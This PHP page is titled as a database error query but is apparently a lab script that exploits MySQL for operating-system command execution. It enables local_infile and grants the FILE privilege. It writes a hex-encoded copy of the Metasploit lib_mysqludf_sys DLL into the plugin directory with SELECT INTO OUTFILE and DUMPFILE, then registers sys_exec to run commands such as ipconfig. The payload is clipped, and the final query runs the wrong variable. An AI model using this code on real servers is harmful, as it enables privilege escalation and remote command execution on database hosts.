<html>
<body>


Query the Database for Errors<br /><br />

<?php
	$servername = "1.2.3.4";
	$username = "CF";
	$password = "CF";
	$dbname = "user_schema";

	// Create connection
	$conn = mysqli_connect($servername, $username, $password, $dbname);

	// Check connection
	if (!$conn) {
  		die("Connection failed: " . mysqli_connect_error());
	}
	//echo "Connected successfully";

	# By Default Local Infile is Disabled in the Global Settings
	$sql_infile = "SET GLOBAL local_infile = true";
	$result = mysqli_query($conn, $sql_infile);

	# Did not work to change the plugin directory...
	# By Default Plugins Directory is c:\Program Files\MySQL\MySQL Server 8.0\lib\plugins
	#$sql_plugin = "SET GLOBAL plugin_dir = 'C:\\ProgramData\\MySQL\\MySQL Server 8.0\\Uploads'";
	#$result = mysqli_query($conn, $sql_infile);
	#echo mysqli_error($conn);

	# Set the secure_file_priv to c:\Windows\Temp
	# Unable to setup from mysql, change the my.ini file
	#$sql_secure = "SET GLOBAL secure_file_priv = 'c:\\windows\\temp'";
	#$result = mysqli_query($conn, $sql_secure);

	# For the lab I created a database that exists called user_schema
	$sql_table = "DROP TABLE root";
	$result = mysqli_query($conn, $sql_table);
	
	# For the lab I created a database that exists called user_schema
	$sql_table = "CREATE TABLE root (line blob)";
	$result = mysqli_query($conn, $sql_table);

	# If you have root capabilities give curly the ability to upload files
	$sql_grant = "GRANT FILE ON user_schema.* TO 'curly'@'10.20.1.102'";
        $result = mysqli_query($conn, $sql_grant);

	# You need to identify the secure_file_priv setting
	# SHOW GLOBAL VARIABLES LIKE '%file_priv';

	#$sql_insert = "SELECT 0x20 INTO OUTFILE 'C:\\\\WINDOWS\\\\Temp\\\\b.txt' LINES TERMINATED BY 0x40414243";

	# UDF File downloaded from the Metasploit Github location
	# xxd -p orig_lib_mysqludf_sys_64.dll | sed 's/^/$hex .= "/' | sed 's/$/";/'
	# Take the first hex character of M or 4d and place in the select statement...
	# Add 0x at the front

	$hex = "0x5a90000300000004000000ffff0000b800000000000000400000000000";
	# --- Clip of UDP dll in hex...
	$hex .= "000000000000000000000000000000000000000000000000000000000000";


	
	$sql_insert = "SELECT 0x4d INTO OUTFILE 'C:\\\\ProgramData\\\\MySQL\\\\MySQL Server 8.0\\\\Uploads\\\\b.dll' LINES TERMINATED BY $hex";
	$result = mysqli_query($conn, $sql_insert);
	#echo mysqli_error($conn);

	# The load_file worked now that I could get it on the box...
	$sql_local = "INSERT INTO root VALUES(load_file('C:\\\\ProgramData\\\\MySQL\\\\MySQL Server 8.0\\\\Uploads\\\\b.dll'))";
	$result = mysqli_query($conn, $sql_local);
	echo mysqli_error($conn);

	$sql_function = "SELECT * FROM root INTO DUMPFILE 'C:\\\\Program Files\\\\MySQL\\\\MySQL Server 8.0\\\\lib\\\\plugin\\\\c.dll'";
	$result = mysqli_query($conn, $sql_function);
	echo mysqli_error($conn);



	# The table contains hex which is a blob where the dll can be placed...
	#
	#$filename = "/var/www/html/app/lib_mysqludf_sys_64.dll";
	#$handle = fopen($filename, "r");
	#$contents = fread($handle, filesize($filename));
	#$sql = "INSERT INTO errorlogs (error, hex) VALUES ('test', local_infile($filename))";
	#echo $sql;
	#$result = mysqli_query($conn, $sql);
	#fclose($handle);
	
	$sql_function = "DROP FUNCTION sys_exec";
	$result = mysqli_query($conn, $sql_function);
	echo mysqli_error($conn);

	$sql_function = "CREATE FUNCTION sys_exec RETURNS integer SONAME 'c.dll'";
	$result = mysqli_query($conn, $sql_function);
	echo mysqli_error($conn);

	# If the password is less than 14 characters then a prompt does not occur on W2k12
	$sql_exec = "SELECT sys_exec('ipconfig') AS r";
	$result = mysqli_query($conn, $sql_function);
	echo mysqli_error($conn);

	#while ($row = mysqli_fetch_assoc($result)) {
	#	echo "<br /><strong>ID:</strong> " . $row['r'];
	#	echo "<br />";
	#}




?>


</body>
</html>
